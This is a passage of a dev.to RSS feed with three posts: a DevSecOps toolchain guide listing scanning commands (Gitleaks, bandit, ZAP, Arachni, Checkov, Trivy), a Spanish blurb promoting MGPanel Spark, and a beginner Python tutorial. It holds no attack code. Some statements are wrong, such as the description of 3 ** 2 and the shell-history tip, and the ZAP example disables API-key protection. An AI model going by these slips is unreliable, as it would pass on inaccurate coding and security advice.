&lt;li&gt;It is a practice of enhancing each server's security. Even though we use the containers for deployment we have to make sure the underlying infrastructure is also secure.&lt;/li&gt;
&lt;li&gt;Team can consult benchmark from CIS and application such as &lt;strong&gt;OpenSCAP&lt;/strong&gt; to review possible server vulnerabilities and determine what steps to take to mitigate risks &lt;/li&gt;
&lt;li&gt;A server must be hardened before the applications and tooling hosted on the server like Kubernetes worker server can be secured &lt;/li&gt;
&lt;li&gt;Implement App Armor Profile and Sec Comp Profile&lt;/li&gt;
&lt;li&gt;You can use Ansible playbook devsec.hardening to harden linux OS, mysql, nginx and ssh here is the link &lt;a href="https://github.com/dev-sec/ansible-collection-hardening"&gt;dev-sec
/
ansible-collection-hardening&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Kubernetes&lt;/strong&gt; &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;I assume that you are using service based Kubernetes cluster and only managing worker server. If you are managing master node then use &lt;strong&gt;kube-bench&lt;/strong&gt;. It is a tool that checks whether Kubernetes is deployed securely by running the checks documented in the CIS Kubernetes Benchmark.&lt;/li&gt;
&lt;li&gt;Only use harden image for worker server. All cloud provider provide CIS benchmark harden image.&lt;/li&gt;
&lt;li&gt;Secrets - Use them but make sure they're encrypted and have RBAC applied &lt;/li&gt;
&lt;li&gt;Security Context - Much of the Runtime practices mentioned can be enforced via SC &lt;/li&gt;
&lt;li&gt;Network Policy - Start with zero-trust(block every thing by default) and add allow rules only as necessary. Best practice to use Service Mesh(like Linkerd or Istio) which provide a lot of feature. If you don't want to implement service mesh then at least use calico overlay network instead of flannel because it support strong network policy management and access control list (ACLs). -- By default, pods accept traffic from any source. The network policy resource in k8s provides a means of configuring whether connections are accepted or refused. You can configure inbound and outbound rules by port, direction, protocol, and other attributes.&lt;/li&gt;
&lt;li&gt;Enforcement - Use OPA(Gatekeeper), Kyverno, etc to apply policies like 'each namespace should have tag of service mesh'.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2&gt;
  &lt;a href="#develop"&gt;
  &lt;/a&gt;
  Develop
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Use IDE like VSCode where you can implement plugins.&lt;/li&gt;
&lt;li&gt;Use SonarLint's free and Open Source VS Code IDE extension. Perform static analysis on JavaScript, Java and Python code.&lt;/li&gt;
&lt;li&gt;Don't hardcode credentials and sensitive information in code instead use environment variable. Also when you use env variable give space at first to not record in history. Ex - $ export CRE=abcd&lt;/li&gt;
&lt;li&gt;Use branching and PR request methods.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2&gt;
  &lt;a href="#build"&gt;
  &lt;/a&gt;
  Build
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Sensitive Information Scanning&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Detecting and preventing hardcoded secrets like passwords, api keys, and tokens in git repos.&lt;/li&gt;
&lt;li&gt;Attackers keep scanning git repo for keys/secrets. If you by mistake upload keys in repo then automatic hacker tool start building VMs on cloud platform and use for mining. Now even cloud providers are smart enough and they also run tools to grep these sensitive information. If they find then immediately send you mail with all information. &lt;/li&gt;
&lt;li&gt;OSS - Gitleaks and truffleHog
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;docker pull zricethezav/gitleaks:latest
docker run -v ${path_to_host_folder_to_scan}:/path zricethezav/gitleaks:latest [COMMAND] --source="/path" [OPTIONS]
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;SCA scanning&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SCA stands for the Source Composition Analysis. Scanning the dependency (eg library) used in the application for security vulnerabilities &lt;/li&gt;
&lt;li&gt;In any application code is just 10% and rest is Open Source Code which has ton of lines of codes which you have not written&lt;/li&gt;
&lt;li&gt;OSS for python is pyraider
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;pip install pyraider
pyraider check -f /Users/raider/project/requirements.txt -e json result.json -e html result.html
pyraider check -f /Users/raider/project/Pipfile.lock
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;SAST Scanning&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SAST stands for Static Application Security Testing. It is the methodology for finding the security flaws in the application from the source code. It is White-box Security testing methodology.&lt;/li&gt;
&lt;li&gt;There are tons of tools available. You can refer this &lt;a href="https://owasp.org/www-community/Source_Code_Analysis_Tools"&gt;OWASP&lt;/a&gt;. Try to implement tool which follow CIS benchmark.&lt;/li&gt;
&lt;li&gt;OSS for python is bandit
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;pip3 install bandit
bandit -r path/to/your/code
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Static Code Analysis&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;It is Code Quality and Code Security scan. It empowers all developers to write cleaner and safer code.&lt;/li&gt;
&lt;li&gt;The only tools I know till now for this purpose is &lt;strong&gt;SonarQube&lt;/strong&gt; that is an open-source platform for continuous inspection of code quality to perform automatic reviews with static analysis of code to detect bugs, code smells, and security vulnerabilities on 20+ programming languages.&lt;/li&gt;
&lt;li&gt;Best practice is to enable gating with 80% code coverage.
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;docker run \
    --rm \
    -e SONAR_HOST_URL="http://${SONARQUBE_URL}" \
    -e SONAR_LOGIN="myAuthenticationToken" \
    -v "${YOUR_REPO}:/usr/src" \
    sonarsource/sonar-scanner-cli
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;SBOM&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Modern software is assembled using third-party and open source components. They are glued together in complex and unique ways and integrated with original code to achieve the desired functionality. An accurate inventory of all components enables organizations to identify risk, allows for greater transparency, and enables rapid impact analysis.&lt;/li&gt;
&lt;li&gt;OSS for SBOM is CycloneDX. It is a lightweight software bill of materials (SBOM) standard designed for use in application security contexts and supply chain component analysis.
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;pip install cyclonedx-bom
pip freeze &amp;gt; requirements.txt
cyclonedx-bom -r -i PATH/TO/requirements.txt -o sbom.xml
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;h2&gt;
  &lt;a href="#test"&gt;
  &lt;/a&gt;
  Test
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;DAST&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;DAST stands for dynamic application security testing. It is the methodology for finding the security flaws in the application when running. It is Black-box Security testing methodology &lt;/li&gt;
&lt;li&gt;For DAST we need to implement test environment and after test complete destroy the environment to reduce cost. Best way to provision infrastructure for test environment is by using terraform.&lt;/li&gt;
&lt;li&gt;OSS for DAST testing is ZAP
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;zap.sh -daemon -host some-host -port some-port -config api.addrs.addr.regex=true -config api.disablekey=true
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Performance Test&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;It is a practice of evaluating how a system performs in terms of responsiveness and stability under a particular workload. Performance tests are typically executed to examine speed, robustness, reliability, and application size. The process incorporates “performance” indicators such as:
&lt;/li&gt;
&lt;li&gt;It gathers all the tests that verify an application’s speed, robustness, reliability, and correct sizing. It examines several indicators such as a browser, page and network response times, server query processing time, number of acceptable concurrent users architected, CPU memory consumption, and number/type of errors which may be encountered when using an application.&lt;/li&gt;
&lt;li&gt;OSS tool is JMeter. It is one of popular open-source tool in the performance space to help measure load time.
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;jmeter -n -t test.jmx -l testresult.jtl
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Penetration Test&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Penetration tests (pentests)are a form of DAST (blackbox) that use external program to interrogate applications through their exposed API and HTTP endpoints. &lt;/li&gt;
&lt;li&gt;Penetration tests simulate automated cyber attacks on production infrastructure.
&lt;/li&gt;
&lt;li&gt;It detect common vulnerabilities such as injection, cross-site scripting and flaws in authentication and identity and access management(IAM) &lt;/li&gt;
&lt;li&gt;OSS for Pentest is Arachni. It is a feature-full, modular, high-performance Ruby framework aimed towards helping penetration testers and administrators evaluate the security of web applications.
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;arachni $URL --report-save-path=$ {BUILD_TAG}.afr 
arachni_reporter ${BUILD_TAG}.afr --reporter=html:outfile=${BUILD_TAG}.zip 
unzip ${BUILD_TAG}.zip 
rm -f ${BUILD_TAG}.zip 
publish html report 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;h2&gt;
  &lt;a href="#deploy"&gt;
  &lt;/a&gt;
  Deploy
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;IaC Scanning&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Scan cloud infrastructure configurations to find misconfigurations before they're deployed. It also scan security vulnerability in cloud infrastructure like IAM user has admin role.&lt;/li&gt;
&lt;li&gt;There are multiple of OSS available. Few of them are terrascan, tfsec and Checkov
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;terraform init
terraform plan -out tf.plan
terraform show -json tf.plan  &amp;gt; tf.json 
checkov -f tf.json
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;K8S Manifest Scanning&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Most of the scanner which scans IaC code are capable to scan kubernetes manifest files.&lt;/li&gt;
&lt;li&gt;It scan misconfigurations and security vulnerability in Kubernetes (JSON/YAML), Helm v3, and Kustomize.&lt;/li&gt;
&lt;li&gt;It scan manifest files for runAsNonRootCheck, privilegeEscalationCheck, readOnlyFileSystem, imageVersionnotusinglatest, securityContextUsed and many more. &lt;/li&gt;
&lt;li&gt;OSS are Terrascan, KubeLinter and Checkov
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;checkov -f deployment.yml -f service.yml
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Image Scanning&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Scan for vulnerabilities in container images, file systems, and Git repositories, as well as for configuration issues.&lt;/li&gt;
&lt;li&gt;Historically, developers have owned the security posture of their own code and the libraries used. Containers add security concerns at the operating-system level such as base-image selection, package installation, user and file permission, and more.&lt;/li&gt;
&lt;li&gt;Don't run as root - Yor probably don't need it. &lt;/li&gt;
&lt;li&gt;Privileged Containers - You almost definitely don't need it. &lt;/li&gt;
&lt;li&gt;Drop capabilities - Most apps don't need even Linux capabilities; dropping all and allow only what's needed. Most of the people consider alpine as a base image.&lt;/li&gt;
&lt;li&gt;Read Only Root Filesystem - Immutability makes exploiting your container harder. &lt;/li&gt;
&lt;li&gt;Deploy from known sources - Pull from known registries only&lt;/li&gt;
&lt;li&gt;OSS are trivy and Twistlock
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;trivy image python:3.4-alpine
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;h2&gt;
  &lt;a href="#monitoring"&gt;
  &lt;/a&gt;
  Monitoring
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;It has combination monitoring, logging and alerting.&lt;/li&gt;
&lt;li&gt;Monitor resources, logging application outputs and alerting events like uptime checks.&lt;/li&gt;
&lt;li&gt;There are multiple stacks available one of them is EFK - Elasticsearch, Fluentd, and Kibana. They are resource consuming stack.&lt;/li&gt;
&lt;li&gt;One of best stack in this field is Prometheus, Grafana and Loki.&lt;/li&gt;
&lt;li&gt;In ISTIO service mesh, Jaeger and Kiali are available.&lt;/li&gt;
&lt;li&gt;Few paid services in this field which are known to be best in monitoring Kubernetes pods and services are New Relic, Dynatrace, Sysdig and Datadoghq.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2&gt;
  &lt;a href="#recap"&gt;
  &lt;/a&gt;
  Recap:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;OSS tools mentioned:&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;kube-bench - Kubernetes Hardening&lt;/li&gt;
&lt;li&gt;ansible-collection-hardening - Linux Hardening&lt;/li&gt;
&lt;li&gt;Linkerd or Istio - Service Mesh&lt;/li&gt;
&lt;li&gt;OPA(gatekeeper) and Kyverno - Policy&lt;/li&gt;
&lt;li&gt;Gitleaks and Trufflehog - Sensetive Information &lt;/li&gt;
&lt;li&gt;pyraider - Source Composition Analysis&lt;/li&gt;
&lt;li&gt;bandit - SAST&lt;/li&gt;
&lt;li&gt;SonarLint and SonarQube - Static Code Analysis&lt;/li&gt;
&lt;li&gt;Cyclonedx - SBOM&lt;/li&gt;
&lt;li&gt;ZAP - DAST&lt;/li&gt;
&lt;li&gt;Jmeter - Performance Test&lt;/li&gt;
&lt;li&gt;Arachni - Pentration Test&lt;/li&gt;
&lt;li&gt;Terrascan, Tfsec, KubeLinter and Checkov - IaC and k8S&lt;/li&gt;
&lt;li&gt;Trivy and Twistlock- Image Scanning&lt;/li&gt;
&lt;li&gt;Prometheus, Grafana and Loki - Monitoring&lt;/li&gt;
&lt;li&gt;Elasticsearch, Fluentd, and Kibana - Monitoring&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;Paid Tools&lt;/strong&gt; which need to consider if you and your manager are more concerned about security:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Snyk - OpenSource, Code, Container and IaC Scan&lt;/li&gt;
&lt;li&gt;Fortify - Static Code Analyzer&lt;/li&gt;
&lt;li&gt;Codacy - Measure code quality&lt;/li&gt;
&lt;li&gt;New Relic&lt;/li&gt;
&lt;li&gt;Dynatrace&lt;/li&gt;
&lt;li&gt;Sysdig&lt;/li&gt;
&lt;li&gt;Datadoghq&lt;/li&gt;
&lt;/ol&gt;



&lt;h2&gt;
  &lt;a href="#final-notes"&gt;
  &lt;/a&gt;
  Final Notes:
&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;Almost all the scanning tools mentioned above can be implemented on any CICD pipeline like GitHub Action, GilabCI, CircleCI, Jenkins, Tekton, or any pipeline which support container based integration in it. I have tried to show examples of cli commands through which it scan. Almost all OSS scanning tools has docker image also on Dockerhub registry through that you can easily pull and run scan test. You need to implement checks after every scan and if it get failed then send reports to the person who trigger the pipeline.&lt;/code&gt;&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://i.giphy.com/media/mBdbauuNxUpnqr1B1u/giphy.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://i.giphy.com/media/mBdbauuNxUpnqr1B1u/giphy.gif" width="480" height="480"&gt;&lt;/a&gt;&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

</description>
      <category>devops</category>
      <category>devsecops</category>
      <category>kubernetes</category>
      <category>cloudnative</category>
    </item>
    <item>
      <title>Prueba tus códigos html, css y javascript con MGPanel en spark</title>
      <author>Eloy Manuel Chacón Martínez</author>
      <pubDate>Fri, 24 Dec 2021 21:35:24 +0000</pubDate>
      <link>https://dev.to/eloymanuelch/prueba-tus-codigos-html-css-y-javascript-con-mgpanel-en-spark-1000</link>
      <guid>https://dev.to/eloymanuelch/prueba-tus-codigos-html-css-y-javascript-con-mgpanel-en-spark-1000</guid>
      <description>&lt;p&gt;Holaa programador, ya sea que estes comenzando en el mundo de la programación web o que ya tengas tiempo siempre vamos a necesitar un lugar donde probar nuestros códigos de una forma fácil, segura y a demás gratis.&lt;/p&gt;

&lt;p&gt;MGPanel tiene una herramienta gratuita para programadores que se llama &lt;strong&gt;Spark&lt;/strong&gt;, con el podrás probar tus html, css y javascript todo en tiempo real, a demás podrás guardarlos para tenerlos de referencia cuando estes programando algún proyecto real.&lt;/p&gt;

&lt;p&gt;Para usar la herramienta ingresa a: &lt;a href="https://app.mgpanel.org/spark"&gt;https://app.mgpanel.org/spark&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--wlRBGuVT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/kkl931ty1o2r00ez94g3.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--wlRBGuVT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/kkl931ty1o2r00ez94g3.png" alt="Image description" width="880" height="470"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;No tienes necesidad de registrarte a menos que quieras guardar tus sparks.  Espero te pueda ayudar en tus proyectos, tanto como me ayuda en los míos.&lt;/p&gt;

</description>
      <category>mgpanel</category>
      <category>javascript</category>
      <category>html</category>
      <category>css</category>
    </item>
    <item>
      <title>Basic Python Concepts</title>
      <author>Ashutosh Mishra</author>
      <pubDate>Fri, 24 Dec 2021 21:28:13 +0000</pubDate>
      <link>https://dev.to/ashutoshmishra/basic-python-concepts-o8d</link>
      <guid>https://dev.to/ashutoshmishra/basic-python-concepts-o8d</guid>
      <description>&lt;p&gt;In this post, we are going to learn about some of the basic concepts of Python which more or less are also found in other programming languages. We'll start from the installation of Python and cover mathematical operations, strings, user input, string operations, variables, and In place operators.&lt;/p&gt;

&lt;p&gt;If you don't know, this blog post and all other future posts in the Python series are part of  &lt;a href="https://www.udemy.com/course/python-masterclass-course/"&gt;this&lt;/a&gt; Udemy course. Do check it out.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#installation"&gt;
  &lt;/a&gt;
  Installation
&lt;/h2&gt;

&lt;p&gt;Before starting if you don't have Python installed on your computer, install the latest version of &lt;a href="https://www.python.org/downloads/"&gt;Python 3&lt;/a&gt; from their website and a corresponding IDE to code which we'll use for writing big programs, you can either go with &lt;a href="https://code.visualstudio.com/download"&gt;VS Code&lt;/a&gt; or &lt;a href="https://www.jetbrains.com/pycharm/download/#section=windows"&gt;Pycharm&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#our-first-program"&gt;
  &lt;/a&gt;
  Our First Program
&lt;/h2&gt;

&lt;p&gt;We'll start with the basic &lt;em&gt;Hello World&lt;/em&gt; program. So open your Python console and follow the article -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;print('Hello World')
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Type the above code in the console and hit enter. By now you would have seen the &lt;strong&gt;Hello World&lt;/strong&gt; printed on your console. That's how easy it is to print something on the console in Python. But let's just move ahead because not everything is going to be that easy in the future.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#maths-operations"&gt;
  &lt;/a&gt;
  Maths Operations
&lt;/h2&gt;

&lt;p&gt;Python console can also be directly used as a calculator and we can perform most of the common operations which we do on a calculator.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#addition-subtraction-multiplication-and-division"&gt;
  &lt;/a&gt;
  Addition, Subtraction, Multiplication, and Division
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="mi"&gt;120&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Type the above code and hit enter and you will see the right answer 200. You can also perform subtraction, multiplication, and division in the console. Copy the code below in your console and see the results.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;50 - 20

30 * 2

12 / 2
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If you're focusing enough, you can see that when we divide certain numbers in Python, we get our result in decimal, just like we got 6.0 in the result of the above division. This is called a Float.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#float"&gt;
  &lt;/a&gt;
  Float
&lt;/h3&gt;

&lt;p&gt;Decimal numbers are known as Float in programming. Float is a number that is not an integer. &lt;br&gt;
Using float with any mathematical expression will always result in float. When dividing 2 numbers, you can avoid getting float as a result by using &lt;em&gt;double slash(//)&lt;/em&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;12 // 2
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The above code will give 6 as a result instead of 6.0, it happens because when we use a double slash in a division, Python gives us the quotient of the division.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#zerodivisionerror"&gt;
  &lt;/a&gt;
  ZeroDivisionError
&lt;/h3&gt;

&lt;p&gt;Dividing any number with zero in Python gives divide by zero error. So avoid dividing any number with zero or performing any other calculation which involves division by zero.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#exponent"&gt;
  &lt;/a&gt;
  Exponent
&lt;/h3&gt;

&lt;p&gt;Exponent is a number raised to the power of a certain number. In Python, you can do this by using **&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;3 ** 2
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The above expression will raise 2 to the power of 3 and you'll get 9 as the result.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#modulus"&gt;
  &lt;/a&gt;
  Modulus
&lt;/h3&gt;

&lt;p&gt;We already discussed how using double slash you can avoid getting float as a result of division. This happens because double slash gives the quotient of a division as a result.&lt;br&gt;
For Ex: 10//3 = 3&lt;/p&gt;

&lt;p&gt;But what if instead of getting quotient, you want the remainder of the division? We have something called &lt;strong&gt;Modulus&lt;/strong&gt; for this case. The symbol of modulus is percent(%). Let's see it in action below -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;11 % 3
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The above operation will result in 2 as the answer because that will be the actual result of the above division. This operation is incredibly useful when you want to know whether a certain number is odd or even. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#string"&gt;
  &lt;/a&gt;
  String
&lt;/h2&gt;

&lt;p&gt;Any text written in Python is a string or in other words, you can also say that anything written within quotes whether single('') or double("") is a string. If you type an integer within quotes, it will also be considered as a string, not an integer. &lt;br&gt;
For Ex: 5 is an integer, '5' is a string.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;NOTE: While writing a string if you want to put an apostrophe somewhere in between, use a backslash(\)&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Instead of writing, 'He's a good boy', write, &lt;code&gt;'He\'s a good boy'&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The latter version of the string will save you from error because you already have finished the string in the first 2 letters. According to Python, you started your string from &lt;strong&gt;H&lt;/strong&gt; and finished it at &lt;strong&gt;e&lt;/strong&gt; since you already have used 2 quotes up to that point.&lt;/li&gt;
&lt;li&gt;If you want your string to be printed on multiple lines instead of one, you can use &lt;code&gt;\n&lt;/code&gt; at the point after which you want to start a new line. &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;
  &lt;a href="#accepting-input-from-the-user"&gt;
  &lt;/a&gt;
  Accepting input from the user
&lt;/h2&gt;

&lt;p&gt;User inputs are very common when building large applications. Consider the example of a &lt;strong&gt;Contacts&lt;/strong&gt; app where the user has to enter the phone number and name to save a contact or a &lt;strong&gt;Chat&lt;/strong&gt; app where users can input words, numbers, emojis, and whatnot. &lt;/p&gt;

&lt;p&gt;In Python, we have a function called &lt;strong&gt;&lt;em&gt;input()&lt;/em&gt;&lt;/strong&gt; that allow users to input numbers, strings, etc in our program.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;input('Please enter a value: ')
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The string inside &lt;em&gt;input()&lt;/em&gt; will be displayed to the user when asked for input. You can modify it according to your needs. Whatever value user inputs will be displayed to the console.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#string-operation"&gt;
  &lt;/a&gt;
  String Operation
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#concatenation-operation"&gt;
  &lt;/a&gt;
  Concatenation operation
&lt;/h3&gt;

&lt;p&gt;Concatenation is the action of joining 2 or more strings together. Suppose there is a string called &lt;em&gt;'Hello'&lt;/em&gt; and there is another string called &lt;em&gt;'World'&lt;/em&gt;. When you concatenate these 2 strings, it becomes &lt;em&gt;'HelloWorld'&lt;/em&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;'Hello' + 'World'
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The plus sign above is the concatenation operator which is used to concatenate strings. If you enter the code right and hit enter, you'll see &lt;code&gt;'HelloWorld'&lt;/code&gt; printed on your console.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Note:&lt;/em&gt; &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;You cannot concatenate a string with a number. &lt;/li&gt;
&lt;li&gt;However, you can multiple a string with a certain number to repeat its occurrence. For Ex - &lt;code&gt;'Hello'*3&lt;/code&gt; will result in &lt;code&gt;'HelloHelloHello'&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Again you cannot multiple a string with a string, it will produce error.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#variables"&gt;
  &lt;/a&gt;
  Variables
&lt;/h2&gt;

&lt;p&gt;If you are familiar with Python or any other programming language, you might already know what a variable is. But in case you don't, you can think of it as a container to store data. Variables are common in every programming language and they let us store data types supported in that programming language. In Python, you can store all the supported data types in the variables.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;a = 100
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the above code, a is the variable that we've used to store the value of 100. The equal(=) sign is called an assignment operator whose job is to assign values. Type &lt;code&gt;print(a)&lt;/code&gt; to print the value of variable &lt;strong&gt;a&lt;/strong&gt; in the console.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#in-place-operators"&gt;
  &lt;/a&gt;
  In place operators
&lt;/h2&gt;

&lt;p&gt;Suppose you're recording your age in a variable and want to update it again this birthday.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;age = 21
age = age + 1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the above code, we first stored our age in a variable and then used a method to update the variable which is logical but isn't the best practice because writing the variable name twice in a line just to add a single value to it is not considered a great practice.&lt;/p&gt;

&lt;p&gt;Instead, we have In place operators which help us change the value without repeating the variable name twice in the line. See the code below -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;age+=1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;age+=1&lt;/code&gt; has same effect as &lt;code&gt;age=age+1&lt;/code&gt;. The &lt;code&gt;+=&lt;/code&gt; removes the need to repeat the variable name twice in the line totally.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;We can also use the subtract and multiplication operator instead of the addition operator to update the subtracted or multiplied value of the variable like &lt;code&gt;age-=2&lt;/code&gt; and &lt;code&gt;age*=4&lt;/code&gt;. The former will reduce the value of the age variable by 2 and the latter will multiply it by 4.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#parting-thoughts"&gt;
  &lt;/a&gt;
  Parting Thoughts
&lt;/h2&gt;

